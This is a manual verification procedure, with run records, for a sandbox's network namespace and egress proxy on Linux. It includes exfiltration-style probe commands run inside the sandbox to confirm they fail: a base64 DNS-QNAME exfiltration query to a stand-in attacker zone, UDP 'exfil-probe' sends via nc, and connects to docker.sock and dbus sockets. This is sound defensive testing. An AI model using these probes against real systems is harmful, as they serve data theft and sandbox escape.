# Network namespace + egress proxy — manual verification on a real Linux host

!!! warning "Status: **PARTIAL — 2026-08-06.** Scenarios 1–5 and 7 pass through live capsule sessions on Ubuntu 24.04; scenario 7 covers the capability-grant reason only. Scenario 6's answer — `CAP_SYS_PTRACE` is not required — was measured with a user-namespace substitute for `docker run`; the two-arm `docker run` comparison has not been run."

    This procedure must be run by hand, on a real Linux host: a green `cargo build`, `cargo test`
    or `cargo clippy` says nothing about this boundary — see
    [What the automated suite does not establish](#what-this-deliberately-is-not).

    Every run is recorded in [Recording the result](#recording-the-result), with the host,
    the date and what was observed. Read that section before treating this page as a clean pass.

## What is being verified { #what-this-verifies }

A capsule's native subprocess tree — the shell tool, any interpreter it starts, anything either of
them spawns — runs inside its own **network namespace**. The only way out of that namespace is a
connection-level proxy in the runtime process that applies `capabilities.network.allow`. Both
decisions are taken from kernel-held state: the namespace's routes and listeners decide where a
connection can go, and nothing reads a destination out of the subprocess's memory. A host that
cannot provide the namespace refuses to launch a subprocess-capable capsule with
[`E-CAP-005`](diagnostics.md#e-cap-005).

The property under test is negative and structural:

> A subprocess cannot reach any host on the network except through the runtime's own proxy, and the
> proxy opens a connection only to a destination `capabilities.network.allow` names. There is no
> route.

| Scenario | Check |
|---|---|
| [1](#scenario-1) | An allowlisted host is reachable end to end, with a real response |
| [2](#scenario-2) | A host that is not allowlisted is unreachable, and the failure is legible |
| [3](#scenario-3) | DNS is decided: an allowlisted name resolves for real, anything else gets a `REFUSED` reply rather than a dropped packet |
| [4](#scenario-4) | A non-DNS UDP send goes nowhere |
| [5](#scenario-5) | `AF_UNIX` is refused by the `socket(2)` domain filter, which the network namespace does not replace |
| [6](#scenario-6) | Whether a container still needs `CAP_SYS_PTRACE` |
| [7](#scenario-7) | The launch refusal on a host that cannot create the namespace |

## What the automated suite does not establish { #what-this-deliberately-is-not }

- **No automated test asserts the security property.** CI never resolves to a tier where this code
  runs, so a test asserting "unlisted connect fails" would pass vacuously on every runner. The unit
  tests cover pure logic only — DNS message parsing, the allow decision, the derived listener-port
  set.
- **Two Linux integration tests run the real mechanism when the host supports it:**
  `kernel_tier_denies_network_connect_outside_allowlist` and
  `kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy`, in the
  `capsule-runtime` crate. They are a regression guard: they check that the permitted path
  functions and that one specific denial holds. They say nothing about DNS, UDP, `AF_UNIX` or the
  refusal path.
- **Reading the code is not evidence.** A structural boundary is observable from inside the
  sandbox; observe it.

## Host prerequisites

```bash
# Linux, and unprivileged user namespaces available.
uname -srm
unshare -Urn true && echo "userns+netns: OK"

# On an AppArmor host (Ubuntu 23.10+), the restriction and the shipped profile.
cat /sys/module/apparmor/parameters/restrict_unprivileged_userns 2>/dev/null   # Y means restricted
aa-status 2>/dev/null | grep -c mur-sealed                                     # 0 means not loaded

# The runtime refuses to launch a subprocess-capable capsule without a cgroup scope, so run
# everything below under a delegated scope, as the sealed-containment page does.
systemd-run --user --scope --property=Delegate=yes -- true && echo "cgroup delegation: OK"
```

If `restrict_unprivileged_userns` is `Y` and no `mur-sealed` profile is loaded, **stop** — that is
scenario 7's precondition, not a broken host. Run [scenario 7](#scenario-7) first, then load the
profile:

```bash
sudo install -m 644 packaging/apparmor/mur-sealed /etc/apparmor.d/mur-sealed
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

## Scenario 0 — the test capsule { #scenario-0 }

```bash
mkdir -p /tmp/netns-check && cd /tmp/netns-check
cat > murmur.yaml <<'YAML'
name: netns-check
version: 0.1.0
description: Manual verification of the capsule network namespace and egress proxy.
capabilities:
  shell:
    allow: [bash, curl, getent, nc, socat, dig]
  network:
    allow: ["https://example.com"]
inference:
  driver:
    artifact: claude
YAML
```

The manifest leaves `capabilities.network.unix_sockets` at its default, `false`, which scenario 5
depends on.

Launch it and drive the checks below through real `bash` tool calls:

```bash
systemd-run --user --scope --property=Delegate=yes -- mur run
```

Every command in scenarios 1–5 runs **inside the capsule's shell tool**, not on the host.

---

## Scenario 1 — an allowlisted host is reachable { #scenario-1 }

```bash
curl -sS -o /dev/null -w '%{http_code}\n' https://example.com/
```

**Expected:** `200` — a real response from the real host, fetched through the proxy in the runtime
process. The runtime does not terminate TLS: the capsule's connection is end to end, and the proxy
sees ciphertext plus the destination it already approved.

Confirm the traffic left through the namespace rather than around it:

```bash
ip -o addr | cat            # expect: lo only. No eth0, no docker0, no host interface.
ip route show table all | cat
```

**Expected:** `lo` is the only interface, and the routing table is the namespace's own — nothing
resembling the host's default route via a physical interface.

---

## Scenario 2 — a host that is not allowlisted is unreachable { #scenario-2 }

```bash
curl -sS -m 10 -o /dev/null -w '%{http_code}\n' https://example.org/ ; echo "exit=$?"
```

**Expected:** a non-zero exit. `example.org` is not in `capabilities.network.allow`, so the
runtime's resolver answers `REFUSED` and no upstream connection is opened; `curl` reports that it
could not resolve the host. The wording varies by `curl` version, so record what you see rather
than matching a string.

The sharper version, with no name resolved at all:

```bash
# A literal address, so no name is resolved.
curl -sS -m 10 -o /dev/null http://93.184.216.34/ ; echo "exit=$?"
```

**Expected:** non-zero. An address the runtime's own resolver never handed out is checked against
the addresses the allowlist resolved to at launch, and nothing else. A port no allow entry implies
has no listener in the namespace, so the connection is refused outright.

---

## Scenario 3 — DNS is decided, not dropped { #scenario-3 }

```bash
# An allowlisted name: resolved for real, upstream, by the runtime.
getent hosts example.com ; echo "exit=$?"

# A name nobody allowed.
getent hosts evil.example.com ; echo "exit=$?"
```

**Expected:** the first prints a real address and exits `0`; the second exits non-zero
**promptly** — not after a resolver timeout — because it received an actual `REFUSED` reply.

The distinction between "refused" and "dropped" is the point of this scenario, so observe the reply
itself:

```bash
dig +short +tries=1 +time=2 example.com
dig +tries=1 +time=2 evil.example.com | grep -E 'status:|ANSWER:'
```

**Expected:** `status: REFUSED` for the unlisted name, with `ANSWER: 0` — a reply, arriving at
once. An allowlisted name gets one of the
[three resolution outcomes](containment.md#capsule-name-resolution) instead, never `REFUSED`.

To see the third outcome, point the runtime's own `/etc/resolv.conf` at an address nothing answers
on (`nameserver 203.0.113.1`, an address reserved for documentation) and start a new `mur run`.

**Expected,** on the runtime's stderr before the capsule starts:

```
[capsule-runtime] warning: the network allowlist host 'example.com' could not be resolved at launch: the resolver did not answer within 5s (a subprocess reaching it by literal address is denied for this run)
```

And inside the capsule, for an allowlisted name:

```bash
time getent hosts example.com ; echo "exit=$?"
```

**Expected:** no address and a non-zero exit, arriving on the lookup deadline — around five seconds
per address family asked — rather than at once. The delay is the signal: the capsule was told
`SERVFAIL`, which a resolver client treats as "ask again", where `NXDOMAIN` would come back at once
and tell it not to bother. Put `/etc/resolv.conf` back afterwards; the runtime reads it once per
process, so the change takes effect on the next `mur run`.

`NXDOMAIN` appears only for an allowlisted name that an upstream answered for, saying it does not
exist.

DNS-shaped exfiltration, run directly:

```bash
# Data smuggled in a QNAME to an attacker-controlled zone.
dig +tries=1 +time=2 "$(echo secret-payload | base64 | tr -d '=').exfil.example.net" \
  | grep -E 'status:'
# A TXT lookup against an allowlisted name — the classic carrier in both directions.
dig +tries=1 +time=2 TXT example.com | grep -E 'status:|ANSWER:'
```

**Expected:** `REFUSED` for the attacker-controlled zone. For the `TXT` query against the
*allowlisted* name, `status: NOERROR` with `ANSWER: 0` — the name exists, and the runtime's
resolver answers only `A` and `AAAA`, so there is no carrier to relay in either direction.

---

## Scenario 4 — non-DNS UDP goes nowhere { #scenario-4 }

```bash
# UDP to a port nothing is bound to inside the namespace.
printf 'x' | nc -u -w 3 8.8.8.8 4444 ; echo "exit=$?"
# UDP to an arbitrary host on 53 that is not the namespace's resolver address.
printf 'x' | nc -u -w 3 198.51.100.7 53 ; echo "exit=$?"
```

**Expected:** both sends go nowhere. Only the resolver socket is bound in the namespace; a datagram
to anything else finds nothing listening and no route off the host. There is no generic UDP
forwarder: the manifest has no UDP allowlist, so forwarding UDP would grant something no capsule
declared.

A UDP `sendto()` succeeds locally whether or not anything receives it, so `exit=0` from `nc` proves
nothing on its own. For a decisive result, bind a UDP listener on the host's own non-loopback
address, confirm a send from the host arrives, then send to it from inside the capsule:

```bash
# On the host:
nc -u -l <host-ip> 5555
# Inside the capsule:
printf 'exfil-probe' | nc -u -w2 <host-ip> 5555 ; echo "exit=$?"
```

**Expected:** the capsule-side `nc` reports `exit=0`, and the host listener receives nothing.

---

## Scenario 5 — `AF_UNIX` is refused by the socket-domain filter { #scenario-5 }

A network namespace does not mediate unix sockets: a pathname socket is reached through the
filesystem, not the network stack. The seccomp filter's `socket(2)` domain rule covers it instead.

```bash
socat - unix-connect:/var/run/docker.sock ; echo "exit=$?"
socat - unix-connect:/run/docker.sock ; echo "exit=$?"
```

Without `socat`, OpenBSD `nc -U` against any unix socket that exists on the host does the same job:

```bash
printf x | nc -U -w2 /run/dbus/system_bus_socket ; echo "exit=$?"
```

**Expected:** every attempt fails with a permission error (`EACCES`) at socket *creation*, before
any connect is attempted. The kernel refuses it from the seccomp filter, with no round-trip to the
runtime. Setting `capabilities.network.unix_sockets: true` lifts this rule for the whole capsule.

---

## Scenario 6 — does a container still need `CAP_SYS_PTRACE`? { #scenario-6 }

**Answer: no.** No decision the runtime takes reads a subprocess's memory, so none depends on the
kernel's `ptrace_may_access` check:

- `connect`/`sendto` are decided by the network namespace and the egress proxy;
- `execve`/`execveat` are decided by Landlock `Execute` rights on the path the kernel resolved;
- the seccomp filter carries no notify rule, so no syscall is stopped for the runtime to inspect.

The runtime process marks itself non-dumpable at startup and every subprocess inherits that flag
and keeps it. With no reader, nothing needs a dumpable subprocess or `CAP_SYS_PTRACE`. What a
container does need is `--cap-add SYS_ADMIN`, to create the capsule's network namespace; without it
the launch refuses with `E-CAP-005`.

### 6a — the capability matrix, without a container runtime { #scenario-6a }

`ptrace_may_access` on a subprocess passes either for a same-uid caller on a **dumpable** target
or for a caller holding `CAP_SYS_PTRACE` in the target's user namespace. The matrix runs an
allowlisted `bash` through the real exec path at the host's live tier, with a non-dumpable
subprocess, across three capability configurations. An unprivileged user namespace with
`CAP_SYS_PTRACE` dropped from the bounding set has the same shape as a Docker container — uid 0,
the default capability set minus a list that includes `CAP_SYS_PTRACE` — and isolates the
capability more sharply than `docker run` does.

`<binary>` is the `capsule-runtime` library test binary
(`cargo test -p capsule-runtime --lib --no-run` prints its path), and `<probe>` is a
`sandbox::linux_integration_tests` test that runs an allowlisted `bash`.

```bash
# Config 1 — ordinary unprivileged host, zero capabilities.
<binary> <probe> --exact --nocapture

# Config 2 — uid 0, full capability set  (≈ docker run --cap-add SYS_PTRACE).
unshare -Ur <binary> <probe> --exact --nocapture

# Config 3 — uid 0, CAP_SYS_PTRACE dropped  (≈ docker run, default capability set).
unshare -Ur capsh --drop=cap_sys_ptrace -- -c '<binary> <probe> --exact --nocapture'
```

**Expected:** all three pass. Configs 1 and 3 run a non-dumpable subprocess without
`CAP_SYS_PTRACE`, the combination in which any memory read of the subprocess fails with
`Permission denied (os error 13)`; their passing is the negative result.

### 6b — the two-arm `docker run` comparison { #scenario-6b }

What the substitute does not reproduce is Docker's two other defaults, the `docker-default`
AppArmor profile and the default seccomp profile. Neither is a capability, and
`--security-opt seccomp=unconfined` alone does not change the outcome, so neither is expected to
matter. On a host with a container runtime:

```bash
# A: with the capability.
docker run --rm -it --cap-add SYS_ADMIN --cap-add SYS_PTRACE \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'

# B: identical, minus SYS_PTRACE.
docker run --rm -it --cap-add SYS_ADMIN \
  --security-opt seccomp=unconfined -v "$PWD":/w -w /w murmur-bench:latest \
  bash -lc 'mur run'
```

**Expected:** both arms launch and run the capsule identically. `--cap-add SYS_ADMIN` is required in
**both**: without it the launch refuses with `E-CAP-005` before the comparison is reached.

---

## Scenario 7 — the refusal on a host that cannot create the namespace { #scenario-7 }

The negative control. A host that cannot give the subprocess tree a network namespace must refuse
the launch, name which of the two reasons applies, and never run the subprocess without the
namespace.

| Reason | Host condition | The message names |
|---|---|---|
| Capability grant missing | AppArmor's `restrict_unprivileged_userns` is on and the `mur-sealed` profile is not confining `mur`, or `unshare` is refused inside a container | The `apparmor_parser` command, the checkout-build script, and `--cap-add SYS_ADMIN` for a container |
| Kernel support missing | `user.max_user_namespaces=0`, or a kernel built with `CONFIG_USER_NS=n` | The `user.max_user_namespaces` sysctl and `CONFIG_USER_NS` |

On an AppArmor host, with the profile unloaded:

```bash
sudo apparmor_parser -R /etc/apparmor.d/mur-sealed 2>/dev/null
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
cd /tmp/netns-check && mur run ; echo "exit=$?"
```

**Expected:** `error[E-CAP-005]`, naming the missing capability grant, the exact `apparmor_parser`
command, *and* the container remedy. No workdir is created. `mur doctor` reports the same
`E-CAP-005` while the restriction is on. Restore the host immediately:

```bash
sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
sudo apparmor_parser -r /etc/apparmor.d/mur-sealed
```

That restores a host whose baseline had the restriction off, which is not the posture murmur
recommends: with the restriction off, unprivileged user namespaces are open to every program on the
machine rather than granted to `mur` by the profile. `mur doctor` reports it as
`userns grant: restriction_disabled_host_wide` and [`W-SEC-013`](diagnostics.md#w-sec-013). On a
host being set up fresh, leave the restriction at `1` and rely on the loaded profile alone.

A `mur` binary built in a checkout (`./target/debug/mur`) is not matched by the shipped profile, so
it reproduces the capability-grant reason whatever the profile's state, unless
`scripts/install-dev-apparmor.sh` has loaded a grant for it.

Then confirm the refusal is scoped to capsules that can spawn a subprocess:

```bash
# murmur-no-subprocess.yaml: the same manifest with capabilities.shell removed, and no
# capabilities.spawn.allow.
mur run --manifest murmur-no-subprocess.yaml ; echo "exit=$?"
```

**Expected:** a capsule with neither `capabilities.shell.allow` nor `capabilities.spawn.allow`
needs no namespace and launches normally, even with the restriction on.

---

## Recording the result

Record every run here: the host (distro, kernel, architecture, whether a container runtime is
installed), the date, and per scenario what was observed. `PENDING` is the correct entry for
anything not run; do not infer a result from a passing build.

| Scenario | Check | Result | Evidence |
|---|---|---|---|
| [1](#scenario-1) | Allowlisted host reachable end to end | **PASS** — Ubuntu 24.04, 2026-08-06 | [Live sessions](#run-2026-08-06-live) |
| [2](#scenario-2) | Unlisted host unreachable | **PASS** — Ubuntu 24.04, 2026-08-06 | [Live sessions](#run-2026-08-06-live) |
| [3](#scenario-3) | DNS refused for unlisted names, resolved for listed ones | **PASS** — Ubuntu 24.04, 2026-08-06, via `getent`; `dig` could not run at that tier | [Live sessions](#run-2026-08-06-live) |
| [4](#scenario-4) | Non-DNS UDP goes nowhere | **PASS** — Ubuntu 24.04, 2026-08-06, with a host-side listener | [Live sessions](#run-2026-08-06-live), [repeat](#run-2026-08-06-repeat) |
| [5](#scenario-5) | `AF_UNIX` refused by the socket-domain filter | **PASS** — Ubuntu 24.04, 2026-08-06, via `nc -U` | [Live sessions](#run-2026-08-06-live) |
| [6](#scenario-6) | `CAP_SYS_PTRACE` required? | **NO** — Ubuntu 24.04, 2026-08-06, capability matrix with controls; `docker run` comparison PENDING | [Capability matrix](#run-2026-08-06-matrix) |
| [7](#scenario-7) | `E-CAP-005` refusal, both reasons | **PASS** — Ubuntu 24.04, 2026-08-06, capability-grant reason only; kernel-support reason PENDING | [Live sessions](#run-2026-08-06-live), [repeat](#run-2026-08-06-repeat) |

### 2026-08-06 — integration tests on a bare host { #run-2026-08-06-integration }

**Host.** `Linux 7.0.0-28-generic #28~24.04.1-Ubuntu SMP`, x86_64, Ubuntu 24.04, non-root
(`uid=1000`), no container runtime installed. `kernel.apparmor_restrict_unprivileged_userns=0`, so
the AppArmor profile was not needed; scenario 7's precondition was not created on this host.

**What ran.** The `capsule-runtime` Linux integration tests, which spawn a real `bash` subprocess
at the host's live tier with a real network namespace and a real egress proxy — not the
capsule-driven procedure above.

| Test | Result | What it showed |
|---|---|---|
| `kernel_tier_denies_network_connect_outside_allowlist` | pass | A real TCP listener opened on the host is unreachable from the subprocess through `bash`'s `/dev/tcp` (`exec 3<>/dev/tcp/127.0.0.1/<port>`, a raw `socket` + `connect` with no DNS and no helper binary), because the subprocess's `127.0.0.1` is its own namespace's loopback. Scenario 2's claim, without name resolution |
| `kernel_tier_reaches_an_allowlisted_destination_through_the_egress_proxy` | pass | The permitted path works. Scenario 1's claim in regression-guard form |
| `unshare -Urn true` | succeeds | The namespace primitive is available |

Scenarios 3, 4, 5 and 7 were not run on this host. Scenario 6 was checked at source level only.

### 2026-08-06 — live capsule sessions { #run-2026-08-06-live }

**Host.** `Linux 7.0.0-28-generic`, x86_64, Ubuntu 24.04, non-root, no container runtime
(`docker` and `podman` both absent). A different machine from the integration-test run.

**What ran, scenarios 1–5.** Real capsule sessions through the same launch path `mur run` uses,
driven by scripted `tool_use` turns against the real `murmur-driver-anthropic` component. Only the
model API was replaced, by a local scripted server, because no `ANTHROPIC_API_KEY` was available.
The fork, seccomp, Landlock, the network namespace and the egress proxy were the production code,
running real `curl`, `getent` and `nc` subprocesses against the public internet.

- **Scenario 1 — PASS.** `curl -sSk -m 10 -o /dev/null -w '%{http_code}' https://example.com/` →
  `200 exit=0`. `-k` was needed because the tier this harness resolved to grants no read access to
  `/etc/ssl/certs`, so `curl` could not validate the certificate chain; a `sealed` capsule, which
  binds `/etc/ssl`, does not need it.
- **Scenario 2 — PASS.** `curl -sSk -m 10 -o /dev/null -w '%{http_code}' https://example.org/` →
  `000 exit=6`, `curl: (6) Could not resolve host: example.org` — a publicly resolvable name that
  does not resolve inside the sandbox. The literal `http://93.184.216.34/` → `exit=7`,
  `curl: (7) ... Couldn't connect to server` — a connection-level refusal with no name involved.
- **Scenario 3 — PASS.** `getent hosts example.com` resolved (`exit=0`);
  `timeout 5 getent hosts evil-name-not-allowed.example.net` failed in about 4 ms (`exit=2`), far
  inside the 5 s ceiling — a prompt refusal, not a dropped packet. The `dig` checks could not run:
  `dig` failed with `net.c:137:try_proto(): socket(): Permission denied` and
  `parse of /etc/resolv.conf failed`, because that tier grants no read of `/etc/resolv.conf` and
  not the `socket()` call `dig` makes. `getent`'s pass/fail establishes the claim.
- **Scenario 4 — PASS.** `nc -u -w2 8.8.8.8 4444` returned `exit=0`, which proves nothing for UDP.
  Re-run against a UDP listener on the host's own non-loopback address, confirmed alive by host-side
  sends before and after: `printf 'exfil-probe' | nc -u -w2 <host-ip> 5555` from inside the capsule
  reported `exit=0`, and the listener received nothing.
- **Scenario 5 — PASS.** No `socat` on this host, and no `/var/run/docker.sock`.
  `printf x | nc -U -w2 /run/dbus/system_bus_socket` → `exit=1`,
  `nc: /run/dbus/system_bus_socket: Permission denied` — `EACCES` at socket creation.

**Scenario 7 — PASS, capability-grant reason.** Run with the compiled `target/debug/mur` against a
real `murmur.yaml`:

```
$ sysctl kernel.apparmor_restrict_unprivileged_userns   # baseline
kernel.apparmor_restrict_unprivileged_userns = 0
$ mur run --explain-scope   # baseline: achieves sealed, floor met
...
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1
kernel.apparmor_restrict_unprivileged_userns = 1
$ mur run
status:  failed
error[E-CAP-005]: this host cannot give the capsule's subprocess tree its own network namespace, so
capabilities.network.allow cannot be enforced for it: this host refused unshare(CLONE_NEWUSER |
CLONE_NEWNET) to the mur binary. On an AppArmor host (Ubuntu 23.10+ and derivatives) this is the
unprivileged-userns restriction: install and load the profile shipped with mur, ...
$ ls /tmp/netns-refusal-check/   # only murmur.yaml — no workdir was created
$ sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0   # restored immediately after
kernel.apparmor_restrict_unprivileged_userns = 0
```

`mur doctor` reported the same `E-CAP-005` while the restriction was on. The kernel-support reason
(`user.max_user_namespaces=0` or `CONFIG_USER_NS=n`) was not exercised: the host could not be
changed to that state and recovered safely. The scoping check (a capsule with no subprocess
capability launches normally) was not run in this session.

**Host state.** The restriction was `0` before and after, confirmed by re-reading the sysctl, and
`/etc/apparmor.d/mur-sealed` was reloaded with `sudo apparmor_parser -r`. The installed profile did
not match `packaging/apparmor/mur-sealed`: it lacked the `capability net_admin,` lines. The profile
carries `flags=(unconfined)`, so this has no functional effect, but re-running the install step in
[Host prerequisites](#host-prerequisites) brings the installed copy up to date.

### 2026-08-06 — repeat run on the same host { #run-2026-08-06-repeat }

Scenarios 1–5 and 7 re-run on the same host through the same launch path, plus the compiled `mur`
binary for scenario 7. Every result matched the live-session run, and two were extended:

- **Scenario 4.** A UDP listener on the host's own non-loopback address, confirmed reachable from
  the host first, was given a 25-second window after the capsule's `nc -u` reported `exit=0`. It
  timed out having received nothing.
- **Scenario 7.** `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=1`, then `mur run` →
  `error[E-CAP-005]` with the full remediation text and an empty workdir; `mur doctor` reported the
  same. The scoping check passed: a capsule with neither `capabilities.shell.allow` nor
  `capabilities.spawn.allow` launched normally with the restriction on. The host was restored with
  `sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0` and
  `sudo apparmor_parser -r /etc/apparmor.d/mur-sealed`, and confirmed back at `0`.

`getent hosts example.com` returned two real IPv6 addresses inside the capsule, which is the
behaviour recorded under [Known limits](#known-limits).

### 2026-08-06 — capability matrix { #run-2026-08-06-matrix }

**Host.** `Linux 7.0.0-28-generic`, x86_64, Ubuntu 24.04, no container runtime
(`command -v docker podman` → nothing), so the `docker run` arms were replaced by the
[6a](#scenario-6a) substitute. The runtime process was made non-dumpable first, as in production.

At this date the runtime's exec check read the executable path from the subprocess's memory, and
the subprocess re-enabled its own dumpable flag before exec so that the read could pass without a
capability. The controls disabled that re-enable, leaving the subprocess non-dumpable, to show the
harness could detect a capability requirement.

```bash
# Config 1 — ordinary unprivileged host, zero capabilities.
$ <binary> sandbox::linux_integration_tests::<probe> --exact --nocapture
Uid:    1000    1000    1000    1000
CapEff: 0000000000000000
exit_code = 7 stderr = ""
ok

# Config 2 — uid 0, full capability set  (≈ docker run --cap-add SYS_PTRACE).
$ unshare -Ur <binary> <probe> --exact --nocapture
Uid:    0       0       0       0
CapEff: 000001ffffffffff
exit_code = 7 stderr = ""
ok

# Config 3 — uid 0, CAP_SYS_PTRACE dropped  (≈ docker run, default capability set).
$ unshare -Ur capsh --drop=cap_sys_ptrace -- -c '<binary> <probe> --exact --nocapture'
Uid:    0       0       0       0
CapEff: 000001fffff7ffff
exit_code = 7 stderr = ""
ok
```

```bash
# Control A — non-dumpable subprocess, uid 0, CAP_SYS_PTRACE PRESENT.
exit_code = 7 stderr = ""
ok

# Control B — non-dumpable subprocess, uid 0, CAP_SYS_PTRACE DROPPED.
called `Result::unwrap()` on an `Err` value: Failed("Permission denied (os error 13)")
FAILED

# Control C — non-dumpable subprocess, ordinary uid 1000, zero capabilities.
called `Result::unwrap()` on an `Err` value: Failed("Permission denied (os error 13)")
FAILED
```

**Result: `CAP_SYS_PTRACE` is not required.** Configs 1–3 pass. Controls B and C fail with
`Permission denied (os error 13)`, and control A shows `CAP_SYS_PTRACE` alone turns that back into
a pass, so the capability was the deciding variable and configs 1–3 are a real negative. The
two-arm `docker run` comparison in [6b](#scenario-6b) is PENDING.

### Pending

| Scenario | What remains | Needs |
|---|---|---|
| [6b](#scenario-6b) | The two-arm `docker run` comparison | A host with a container runtime |
| [7](#scenario-7) | The kernel-support-missing reason | A host that can be set to `user.max_user_namespaces=0`, or a kernel built with `CONFIG_USER_NS=n` |

## Known limits { #known-limits }

- **Network reach.** The namespace's port, IPv4 and address→name binding limits are listed in
  [Network reach limits](containment.md#network-reach-limits).
- **`/proc` is the host's on the `sealed` tier**, so process metadata visibility is as
  [`sealed`'s `/proc` exception](containment.md#field-containment) describes.
